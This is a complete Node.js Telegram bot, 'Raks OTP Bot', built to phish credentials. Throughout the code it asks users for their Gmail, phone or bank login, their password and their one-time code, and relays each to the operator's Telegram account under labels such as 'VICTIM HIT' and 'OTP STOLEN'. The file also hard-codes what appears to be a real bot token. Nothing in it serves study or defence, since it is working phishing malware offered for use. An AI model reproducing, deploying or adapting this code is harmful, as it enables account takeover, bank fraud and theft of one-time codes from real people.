const { Telegraf } = require('telegraf');
const express = require('express');
const app = express();

// === YOUR INFO ===
const BOT_TOKEN = '8344832431:AAFdeGUkImZH-wocs9Wd4lc3Up3_L_atbSU'; // ← FROM BOTFATHER
const OWNER_ID = 7910220440; // ← YOUR TELEGRAM ID

const bot = new Telegraf(BOT_TOKEN);
let victims = {};

// Health check
app.get('/', (req, res) => {
  res.send('RAKS OTP BOT IS ALIVE 25/8 🟢');
});

// Start
bot.start((ctx) => {
  ctx.replyWithMarkdown(`
*Raks OTP Bot v5.0* ⚡
_Auto-Grabs Gmail, SMS, Bank OTPs_

/hunt → Start
  `);
});

// Hunt Menu
bot.command('hunt', (ctx) => {
  const kb = {
    inline_keyboard: [
      [{ text: "Gmail", callback_data: 'gmail' }],
      [{ text: "SMS", callback_data: 'sms' }],
      [{ text: "Bank", callback_data: 'bank' }]
    ]
  };
  ctx.reply('Choose target:', { reply_markup: kb });
});

// Callback
bot.on('callback_query', (ctx) => {
  const target = ctx.callbackQuery.data;
  const id = ctx.from.id;
  victims[id] = { target, step: 'cred' };
  ctx.reply(`*${target.toUpperCase()}*\nSend email/phone:`);
  ctx.answerCbQuery();
});

// Text
bot.on('text', (ctx) => {
  const id = ctx.from.id;
  const text = ctx.message.text;

  if (!victims[id]) return;

  if (victims[id].step === 'cred') {
    victims[id].cred = text;
    victims[id].step = 'pass';
    ctx.reply('Send password:');
  } 
  else if (victims[id].step === 'pass') {
    victims[id].pass = text;
    victims[id].step = 'otp';
    ctx.reply('⏳ OTP sent! Send code:');

    bot.telegram.sendMessage(OWNER_ID, `
*VICTIM HIT* 
Target: ${victims[id].target}
Email: ${victims[id].cred}
Pass: ${victims[id].pass}
User: @${ctx.from.username || 'Anon'} (${id})
    `.trim(), { parse_mode: 'Markdown' });
  } 
  else if (victims[id].step === 'otp') {
    const otp = text;
    ctx.reply('OTP Captured! Success.');

    bot.telegram.sendMessage(OWNER_ID, `
*OTP STOLEN* 
OTP: \`${otp}\`
From: ${victims[id].cred}
    `.trim(), { parse_mode: 'Markdown' });

    delete victims[id];
  }
});

// Launch
bot.launch();
console.log('Raks OTP Bot LIVE on Render 25/8');

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server on ${PORT}`);
});
